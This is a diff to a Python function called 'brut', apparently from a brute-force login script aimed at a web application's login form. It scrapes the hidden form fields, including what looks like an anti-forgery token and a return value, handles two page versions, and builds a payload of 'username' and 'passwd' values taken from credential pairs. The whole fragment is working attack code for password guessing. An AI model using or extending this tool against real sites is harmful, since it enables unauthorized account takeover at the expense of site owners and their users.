@@ -30,18 +30,45 @@ def brut(string):
     try:
         parsed = lxml.html.fromstring(response.text)
         links = parsed.xpath("//input[@value]")
+        #print(links)
         list = []
         for i in links:
             #print(i.attrib['value'])
             list.append(i.attrib['value'])
+            #print(list)
         for i in links:
             #print(i.attrib['name'])
             cod = (i.attrib['name'])
         retur = list[2]
-        #print(cod)
-        #print(retur)
+        print('######Version 3.x.x######')
+        print(cod)
+        print(retur)
+        print('#########################')
     except:
-        print('Error parsing url')
+        try:
+            parsed = lxml.html.fromstring(response.text)
+            links = parsed.xpath("//input[@value]")
+            #print(links)
+            r = []
+            c = []
+            for i in links:
+                #print(i.attrib['value'])
+                r.append(i.attrib['value'])
+            i=response.text.index('hidebtn')
+            s1=response.text[i+1:]
+            parsed = lxml.html.fromstring(s1)
+            links = parsed.xpath("//input[@value]")
+            #print(s1)
+            for i in links:
+                #print(i.attrib['name'])
+                cod = (i.attrib['name'])
+            retur = r[3]
+            print('######Version 2.x.x######')
+            print(cod)
+            print(retur)
+            print('#########################')
+        except:
+            print('Error parsing url')
     payload = {
         'username':t[0],
         'passwd':t[1],
